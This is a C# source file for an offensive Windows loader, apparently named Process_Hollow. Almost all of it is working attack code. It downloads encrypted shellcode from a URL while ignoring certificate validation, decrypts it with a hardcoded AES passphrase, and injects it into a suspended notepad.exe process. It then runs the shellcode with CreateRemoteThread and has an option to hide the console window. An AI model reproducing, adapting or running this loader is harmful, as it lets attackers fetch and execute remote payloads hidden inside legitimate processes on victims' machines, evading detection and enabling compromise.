

using System;
using System.IO;
using System.Net;
using System.Text;
using System.Security.Cryptography.X509Certificates;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Collections.Generic;
using System.Diagnostics;



public class Win32
{
	[StructLayout(LayoutKind.Sequential)]
	public class SecurityAttributess
	{
		public Int32 Length = 0;
		public IntPtr lpSecurityDeshellcoderiptor = IntPtr.Zero;
		public bool bInheritHandle = false;
		public SecurityAttributess() { this.Length = Marshal.SizeOf(this);}

	}
	[StructLayout(LayoutKind.Sequential)]
	public struct ProcessInformation
	{
		public IntPtr hProcess;
		public IntPtr hThread;
		public Int32 dwProcessId;
		public Int32 dwThreadId;
	}
	[StructLayout(LayoutKind.Sequential)]
	public class StartupInfo
	{
		public Int32 cb = 0;
		public IntPtr lpReserved = IntPtr.Zero;
		public IntPtr lpDesktop = IntPtr.Zero;
		public IntPtr lpTitle = IntPtr.Zero;
		public Int32 dwX = 0;
		public Int32 dwY = 0;
		public Int32 dwXSize = 0;
		public Int32 dwYSize = 0;
		public Int32 dwXCountChars = 0;
		public Int32 dwYCountChars = 0;
		public Int32 dwFillAttribute = 0;
		public Int32 dwFlags = 0;
		public Int16 wShowWindow = 0;
		public Int16 cbReserved2 = 0;
		public IntPtr lpReserved2 = IntPtr.Zero;
		public IntPtr hStdInput = IntPtr.Zero;
		public IntPtr hStdOutput = IntPtr.Zero;
		public IntPtr hStdError = IntPtr.Zero;
		public StartupInfo() {this.cb = Marshal.SizeOf(this);}
	}
	[Flags]
	public enum CreateProcessFlags : uint
	{
		DEBUG_PROCESS = 0x00000001,
		DEBUG_ONLY_THIS_PROCESS = 0x00000002,
		CREATE_SUSPENDED = 0x00000004,
		DETACHED_PROCESS = 0x00000008,
		CREATE_NEW_CONSOLE = 0x00000010,
		NORMAL_PRIORITY_CLASS = 0x00000020,
		IDLE_PRIORITY_CLASS = 0x00000040,
		HIGH_PRIORITY_CLASS = 0x00000080,
		REALTIME_PRIORITY_CLASS = 0x00000100,
		CREATE_NEW_PROCESS_GROUP = 0x00000200,
		CREATE_UNICODE_ENVIRONMENT = 0x00000400,
		CREATE_SEPARATE_WOW_VDM = 0x00000800,
		CREATE_SHARED_WOW_VDM = 0x00001000,
		CREATE_FORCEDOS = 0x00002000,
		BELOW_NORMAL_PRIORITY_CLASS = 0x00004000,
		ABOVE_NORMAL_PRIORITY_CLASS = 0x00008000,
		INHERIT_PARENT_AFFINITY = 0x00010000,
		INHERIT_CALLER_PRIORITY = 0x00020000,
		CREATE_PROTECTED_PROCESS = 0x00040000,
		EXTENDED_STARTUPINFO_PRESENT = 0x00080000,	
		PROCESS_MODE_BACKGROUNT_BEGIN = 0x00100000,
	       	PROCESS_MODE_BACKGROUND_END = 0x00200000,	
		CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
		CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
	       	CREATE_DEFAULT_ERROR_MODE = 0x04000000,
		CREATE_NO_WINDOW = 0x08000000,
	       	PROFILE_USER = 0x10000000,  
		PROFILE_KERNEL = 0x20000000,
		PROFILE_SERVER = 0x40000000,
		CREATE_IGNORE_SYSTEM_DEFAULT = 0x80000000,
	}
	[DllImport("kernel32.dll")]
	public static extern IntPtr CreateProcessA(String lpApplicationName, String lpCommandLine,SecurityAttributess lpProcessAttributes, SecurityAttributess lpThreadAttributes, Boolean bInheritHandles, CreateProcessFlags dwCreationFlags, IntPtr lpEnvironment, String lpCurrentDirectory, [In] StartupInfo lpStartupInfo, out ProcessInformation lpProcessInformation);
	[DllImport("kernel32.dll")]
	public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);
	[DllImport("kernel32.dll")]
	public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] buffer, IntPtr dwSize, int lpNumberOfBytesWritten);
	[DllImport("kernel32.dll")]
	public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
	[DllImport("kernel32.dll")]
	public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
	[DllImport("Kernel32")]
        public static extern IntPtr GetConsoleWindow();
        [DllImport("user32")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
	// Variables
        public static int PROCESS_CREATE_THREAD = 0x0002;
        public static int PROCESS_QUERY_INFORMATION = 0x0400;
        public static int PROCESS_VM_OPERATION = 0x0008;
        public static int PROCESS_VM_WRITE = 0x0020;
        public static int PROCESS_VM_READ = 0x0010;
        public static UInt32 MEM_COMMIT = 0x1000;
        public static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        public static UInt32 PAGE_EXECUTE_READ = 0x20;
        public static UInt32 PAGE_READWRITE = 0x04;
        public static int SW_HIDE = 0;
	
}

// this is for decrypting the downloaded shellcode
public class Decrypt
{
        public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
        {
                byte[] decryptedBytes = null;
                byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

                using (MemoryStream ms = new MemoryStream())
                {
                        using (RijndaelManaged AES = new RijndaelManaged())
                        {
                                AES.KeySize = 256;
                                AES.BlockSize = 128;

                                var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                                AES.Key = key.GetBytes(AES.KeySize / 8);
                                AES.IV = key.GetBytes(AES.BlockSize / 8);

                                AES.Mode = CipherMode.CBC;

                                using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                                {
                                        cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                                        cs.Close();
                                }
                                decryptedBytes = ms.ToArray();
                        }
                }

                return decryptedBytes;
        }
}

public class Program
{
	
	public static void Hollow(string targetBinaryPath, byte[] shellcode)
	{
		// Local Variables
		Int32 size = shellcode.Length;
		Win32.StartupInfo sInfo = new Win32.StartupInfo();
		sInfo.dwFlags = 0;
		Win32.ProcessInformation pInfo;
		// Create the process with CREATE_SUSPENDED flag
		IntPtr funcAddr = Win32.CreateProcessA(targetBinaryPath, null, null, null, true, Win32.CreateProcessFlags.CREATE_SUSPENDED, IntPtr.Zero, null, sInfo, out pInfo);
		IntPtr hProcess = pInfo.hProcess;
		// Alocate memory for the shellcode
		IntPtr spaceAddr = Win32.VirtualAllocEx(hProcess, new IntPtr(0), size, Win32.MEM_COMMIT, Win32.PAGE_READWRITE);
		// Write shellcode into allocated memory
		bool bWrite = Win32.WriteProcessMemory(hProcess, spaceAddr, shellcode, (IntPtr)size, 0);
		// Change memory permission to PAGE_EXECUTE_READ
		uint oldProtect;
		Win32.VirtualProtectEx(hProcess, spaceAddr, (UIntPtr)shellcode.Length, Win32.PAGE_EXECUTE_READ, out oldProtect);

		Console.WriteLine("[>] Executing ShellCode in {0} with PID {1} ", targetBinaryPath, pInfo.dwProcessId);
		// Execute ShellCode
		Win32.CreateRemoteThread(hProcess, new IntPtr(0), new uint(), spaceAddr, new IntPtr(0), new uint(), new IntPtr(0));

	}

	// connect to the "shellcode_url", download its contents and return a byte array
        public static byte[] downloader(string shellcode_url)
        {
                WebClient wc = new WebClient();
                wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64 blalalala)");

                // selects the version of tls to use
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

                // Ignore Certificate Check, remove on production!
                // check stackovflow for "how to ignore the certificate check when ssl" question
                ServicePointManager.ServerCertificateValidationCallback = delegate {return true;};
                byte[] shellcode = wc.DownloadData(shellcode_url);
                return shellcode;


        }

	public static void Main(string[] args)
        {
		if (args.Length != 1)
		{
			Console.WriteLine("[!] Usage: Process_Hollow.exe <shellcode_url>");
			return;
		}

                // Hide Process Window
                //var handle = Win32.GetConsoleWindow();
                //Win32.ShowWindow(handle, Win32.SW_HIDE);

                string url = args[0];
                byte[] shellcode = downloader(url);

                byte[] password = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes("DtGvFck#"));
                shellcode = Decrypt.AES_Decrypt(shellcode, password);

		Console.WriteLine("[<] {0} Bytes Downloaded! ", shellcode.Length);
		// target binary
		string targetBinaryPath = @"C:\\Windows\\System32\\notepad.exe";

		Hollow(targetBinaryPath, shellcode);	
		
        }

}




